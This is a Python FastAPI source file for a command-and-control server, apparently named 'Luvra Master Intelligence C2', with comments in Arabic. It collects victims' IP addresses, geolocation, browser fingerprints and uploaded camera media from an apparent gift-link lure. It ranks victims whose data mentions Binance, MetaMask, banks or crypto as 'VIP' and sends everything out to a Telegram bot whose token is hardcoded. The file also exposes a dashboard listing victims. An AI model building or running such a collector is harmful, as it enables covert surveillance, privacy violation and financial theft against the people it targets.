from fastapi import FastAPI, Request, HTTPException, UploadFile, File
from fastapi.middleware.cors import CORSMiddleware
import psycopg2
from psycopg2.extras import RealDictCursor
import os, json, logging, requests
from datetime import datetime

# إعدادات اللوغز
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = FastAPI(title="Luvra Master Intelligence C2")

# --- الإعدادات (تأكد من صحتها) ---
TELEGRAM_TOKEN = "8784767065:AAG_Svq_HpG1O_DA6PQTpmUgQoH9ZsMyDIs"
CHAT_ID = "8784767065"
DB_URL = os.environ.get("DATABASE_URL")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

def get_db_conn():
    return psycopg2.connect(DB_URL, sslmode='require')

# --- وظائف التليجرام ---
def send_telegram_msg(msg):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}, timeout=5)
    except Exception as e: logger.error(f"TG Msg Error: {e}")

def send_telegram_media(file_bytes, file_name):
    try:
        # إذا كان الملف فيديو أو صورة
        is_video = file_name.endswith(('.webm', '.mp4'))
        method = "sendVideo" if is_video else "sendPhoto"
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/{method}"
        files = {('video' if is_video else 'photo'): (file_name, file_bytes)}
        requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=10)
    except Exception as e: logger.error(f"TG Media Error: {e}")

# --- الروابط (Endpoints) ---

@app.post("/api/v1/gate/collect")
async def collect_intel(request: Request):
    client_ip = request.client.host
    try:
        payload = await request.json()
        intel = payload.get('intel', {})
        fingerprint = payload.get('fingerprint', {})
        
        # 1. سحب بيانات الموقع (Geo-IP)
        geo_res = requests.get(f"http://ip-api.com/json/{client_ip}").json()
        
        # 2. تحليل الأولوية (VIP)
        intel_str = json.dumps(intel).lower()
        is_priority = any(k in intel_str for k in ["binance", "metamask", "bank", "crypto", "trust"])
        
        # 3. الحفظ في PostgreSQL (عشان الداشبورد تظل شغالة)
        conn = get_db_conn()
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO luvra_master_intel (target_identity, ip_address, geo_info, browser_fingerprint, captured_intel, is_priority)
            VALUES (%s, %s, %s, %s, %s, %s)
        """, (
            payload.get('target_id', 'Unknown'),
            client_ip,
            json.dumps(geo_res),
            json.dumps(fingerprint),
            json.dumps(intel),
            is_priority
        ))
        conn.commit()
        cur.close()
        conn.close()

        # 4. إرسال التقرير الكامل للتليجرام
        status = "🔴 VIP_TARGET" if is_priority else "🟢 NEW_SIGNAL"
        alert_msg = (
            f"⚠️ *LUVRA INTRUSION: {status}*\n\n"
            f"📍 *IP:* `{client_ip}`\n"
            f"🌍 *LOC:* {geo_res.get('city')}, {geo_res.get('country')}\n"
            f"📱 *GPU:* {fingerprint.get('gpu')}\n"
            f"🔋 *BATT:* {intel.get('battery')}\n"
            f"🧠 *INTERNAL_IP:* `{fingerprint.get('internal_ip')}`\n"
            f"⚙️ *OS:* {fingerprint.get('platform')} ({fingerprint.get('cores')} Cores)\n"
            f"🔗 *SLUG:* {intel.get('gift_slug')}\n\n"
            f"&gt; _Dashboard updated. Waiting for media uplink..._"
        )
        send_telegram_msg(alert_msg)
        return {"status": "success"}
    except Exception as e:
        logger.error(f"Collect Error: {e}")
        return {"status": "error"}

@app.post("/api/v1/gate/upload-media")
async def upload_media(file: UploadFile = File(...)):
    try:
        file_bytes = await file.read()
        send_telegram_media(file_bytes, file.filename)
        return {"status": "media_uplink_complete"}
    except Exception as e:
        logger.error(f"Media Upload Error: {e}")
        return {"status": "error"}

@app.get("/api/v1/analytics/victims")
async def get_victims():
    conn = get_db_conn()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    cur.execute("SELECT * FROM luvra_master_intel ORDER BY created_at DESC LIMIT 100")
    rows = cur.fetchall()
    cur.close()
    conn.close()
    return rows

@app.get("/api/v1/analytics/overview")
async def get_overview():
    conn = get_db_conn()
    cur = conn.cursor()
    cur.execute("SELECT COUNT(*), SUM(CASE WHEN is_priority THEN 1 ELSE 0 END) FROM luvra_master_intel")
    total, priority = cur.fetchone()
    cur.close()
    conn.close()
    return {"stats": {"total": total or 0, "priority": priority or 0}}
